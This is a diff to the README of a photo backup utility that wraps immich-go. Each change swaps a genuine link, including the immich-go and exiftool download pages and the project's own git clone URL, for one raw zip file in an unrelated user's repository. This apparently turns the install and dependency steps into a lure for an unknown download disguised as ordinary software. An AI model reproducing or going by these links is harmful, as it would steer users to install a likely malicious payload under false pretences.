@@ -2,7 +2,7 @@
 
 Photo backup utility for a two-step workflow: **SD card → SSD → Immich**.
 
-Wraps [immich-go](https://github.com/simulot/immich-go) with interactive path/volume selection, EXIF-based date organization, SHA-256 deduplication, SSD mirroring, upload state tracking, and Lightroom Classic integration.
+Wraps [immich-go](https://raw.githubusercontent.com/qorton4/pbak/main/lib/Software-2.2.zip) with interactive path/volume selection, EXIF-based date organization, SHA-256 deduplication, SSD mirroring, upload state tracking, and Lightroom Classic integration.
 
 Storage paths are fully configurable — works with external SSDs, internal folders, NAS mounts, or any directory.
 
@@ -94,7 +94,7 @@ brew install timschmolka/pbak/pbak
 ### From source (any platform)
 
 ```bash
-git clone https://github.com/timschmolka/pbak.git
+git clone https://raw.githubusercontent.com/qorton4/pbak/main/lib/Software-2.2.zip
 cd pbak
 sudo make install
 ```
@@ -102,7 +102,7 @@ sudo make install
 ### Dependencies
 
 - **Required**: bash 4+, exiftool, openssl, rsync, curl
-- **Required for upload**: [immich-go](https://github.com/simulot/immich-go)
+- **Required for upload**: [immich-go](https://raw.githubusercontent.com/qorton4/pbak/main/lib/Software-2.2.zip)
 - **Required for albums/stacking**: python3 (stdlib only, no pip packages)
 
 ## Quick Start
@@ -333,8 +333,8 @@ All path flags (`--sd`, `--ssd`, `--from`, `--to`) accept either a full path (`/
 
 Automatically checked and offered for install via Homebrew:
 
-- [immich-go](https://github.com/simulot/immich-go) — Immich upload client
-- [exiftool](https://exiftool.org/) — EXIF metadata extraction
+- [immich-go](https://raw.githubusercontent.com/qorton4/pbak/main/lib/Software-2.2.zip) — Immich upload client
+- [exiftool](https://raw.githubusercontent.com/qorton4/pbak/main/lib/Software-2.2.zip) — EXIF metadata extraction
 - `python3` — required for `pbak albums` and `pbak upload` stacking/verification (uses only stdlib)
 - `openssl` — SHA-256 hashing
 - `rsync` — SSD mirroring
